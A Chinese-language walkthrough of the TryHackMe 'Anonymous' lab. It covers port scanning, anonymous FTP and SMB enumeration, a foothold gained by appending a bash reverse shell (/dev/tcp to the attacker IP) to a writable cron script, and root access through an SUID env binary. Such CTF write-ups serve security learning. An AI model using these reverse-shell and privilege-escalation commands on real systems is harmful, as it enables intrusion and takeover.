# Anonymous Writeup
###### tags: `thm`
> URL : https://tryhackme.com/room/anonymous

IP : 10.10.142.45

## Recon
- 掃 Port 起手式
    - `rustscan -a 10.10.142.45 -r 1-65535 --ulimit 5000`
        - 22
        - 21
        - 139
        - 445
    - `nmap -A -p21,22,139,445 10.10.142.45`
        - 21 : FTP
            - VSFTPD 2.0.8
        - 22 : SSH
        - 139: SMB
        - 445: SMB
        - ![](https://i.imgur.com/2TM1uMz.png)
- 嘗試連接 ftp
    - `ftp 10.10.142.45` 使用 anonymous 登入
    - ![](https://i.imgur.com/b7Qrl7f.png)
    - 發現裡面有一個 `scripts` 資料夾
        - 先把裡面所有檔案都載下來
        - ![](https://i.imgur.com/KsKVdo3.png)
        
- 觀察檔案
    - `clean.sh`
        - 看起來是一段 清除資料的 bash script
        - ![](https://i.imgur.com/4Lcnfv6.png)
    - `removed_files.log`
        - 看起來東西都是空的，是上述腳本的輸出
        - ![](https://i.imgur.com/0mXudWi.png)
    - `to_do.txt`
        - 看起來沒有很重要
        - ![](https://i.imgur.com/PTl2P7B.png)

- 嘗試連線 SMB
    - 發現有一個 pics 資料夾
        - ![](https://i.imgur.com/i7i7LGJ.png)
    - 裡面有兩張圖片
        - ![](https://i.imgur.com/WXjKMEq.png)
    - 把兩張圖片載下來
        - ![](https://i.imgur.com/ZRYflNb.png)
- 觀察圖片
    - 看起來是狗勾!
        - ![](https://i.imgur.com/jLqjCjO.png)
    - 用 Exif tool 觀察
        - ![](https://i.imgur.com/MSukA0V.png)
        - ![](https://i.imgur.com/rc3Z36u.png)
        - 可以看出 Photoshop 編輯過
    - 後來還用了 `steghide` 等程式，都沒有結果 

## 嘗試 Exploit
- 尋找到 Vsftpd 2.3.4 有 Exploit
    - https://www.exploit-db.com/exploits/49757
    - `wget https://www.exploit-db.com/download/49757 -O 49757.py`
    - 發現他是 Anonymous only，所以這個 Exploit 不能用!!
    - 用了 msf 也是一樣的結果 QQ
        - ![](https://i.imgur.com/P18sSV3.png)
    
- 突然想到，說不定 ftp 上面的 `clean.sh` 是一個 cron job
    - 我們既然有讀寫的權限，可以在上面戳個 reverse shell 再傳上去
    - `echo bash -c "'bash -i >& /dev/tcp /10.13.21.55/7877 0>&1'" >> clean.sh`
    - 本地端開 nc 來接
- 成功接上ㄌ
    - ![](https://i.imgur.com/0iyaFLU.png)
    - 取得 User flag
        - ![](https://i.imgur.com/ysQnHSX.png)
## 提權
- 起手式 `sudo -l`
    - 看起來沒東西 QQ
    - ![](https://i.imgur.com/m70zKKl.png)
- 準備 Linenum
    - `wget 10.13.21.55:8000/LinEnum.sh`
    - 掃到了 `/usr/bin/env` 有 suid
    - ![](https://i.imgur.com/NhM5A75.png)
- 透過 [GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) 尋找 env SUID 提權
    - `/usr/bin/env /bin/sh -p`
- 成功提權
    - ![](https://i.imgur.com/qbMSXz6.png)
    - 取得 Root Flag
        - ![](https://i.imgur.com/vsaOGRa.png)

## 心得
FTP 上面的檔案也有可能是 Cron Job，看到 shell 就優先懷疑它是 cron ，看看能不能戳一些東西上去。打 Exploit 前須要先確定一下他有沒有一些限制(FTP的不能是 Anonymous登入)。